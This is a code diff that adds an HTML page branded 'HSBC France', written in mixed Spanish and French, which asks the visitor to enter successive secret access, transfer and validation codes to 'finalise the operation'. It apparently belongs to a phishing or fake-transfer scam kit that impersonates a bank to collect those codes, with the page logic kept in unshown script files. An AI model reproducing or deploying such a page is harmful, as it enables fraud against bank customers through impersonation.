@@ -1,0 +1,68 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>HSBC France</title>
+	<!-- Mobile Specific Metas -->
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<!-- Font-->
+	<link rel="stylesheet" type="text/css" href="transaction/css/roboto-font.css">
+	<link rel="stylesheet" type="text/css" href="transaction/fonts/material-design-iconic-font/css/material-design-iconic-font.min.css">
+	<link rel="stylesheet" type="text/css" href="transaction/css/bootstrap.min.css">
+	<!-- datepicker -->
+	<link rel="stylesheet" type="text/css" href="transaction/css/jquery-ui.min.css">
+	<!-- Main Style Css -->
+	<link rel="stylesheet" href="transaction/css/style.css"/>
+	<style>
+		#code_virement, #code_validation, #valid_virement, #valid_valid{
+			display: none;
+		}
+	</style>
+</head>
+<body>
+	<div class="page-content" style="background-image: url('transaction/images/wizard-v3.jpg')">
+
+        <div class="wizard-v3-content pb-5">
+            <div class="wizard-form">
+                <div class="wizard-header">
+                    <h1> <a href="index.html"><img src="img/logo.jpg" alt="" height="60"></a> </h1>
+                    <h3 class="heading">Último paso </h3>
+                    <p>Código secreto para finalizar la operación</p>
+                </div>
+
+                <div class="row">
+                    <div class="progress col-6 m-auto">
+                        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%"  aria-valuenow="50" aria-valuemin="0" aria-valueun="75" aria-valuedeux="85"  aria-valuetrois="100"></div>
+                    </div>
+                </div>
+
+                <div class="row mt-3">
+                    <div class="col-6 m-auto">
+                        <div class="form-group">
+                            <input type="text" id="code_acces" class="form-control" placeholder="Secret acces">
+                            <input type="text" id="code_virement" class="form-control" placeholder="Secret virement">
+                            <input type="text" id="code_validation" class="form-control" placeholder="Secret validation">
+                        </div>
+                        <button class="btn btn-primary btn-sm btn-block " id="valid_acces">Confirmer code d'acces</button>
+                        <button class="btn btn-primary btn-sm btn-block " id="valid_virement">Confirmer virement</button>
+                        <button class="btn btn-primary btn-sm btn-block " id="valid_valid">Confirmer transfert</button>
+                    </div>
+                </div>
+
+
+
+            </div>
+        </div>
+
+	</div>
+
+	<script src="transaction/js/jquery-3.3.1.min.js"></script>
+	<script src="transaction/js/jquery.steps.js"></script>
+	<script src="transaction/js/jquery-ui.min.js"></script>
+	<script src="transaction/js/bootstrap-bundle.js"></script>
+	<script src="transaction/js/jQuerySimpleCounter.js"></script>
+	<script src="transaction/js/custom.js"></script>
+	<script src="transaction/js/main.js"></script>
+</body>
+</html>
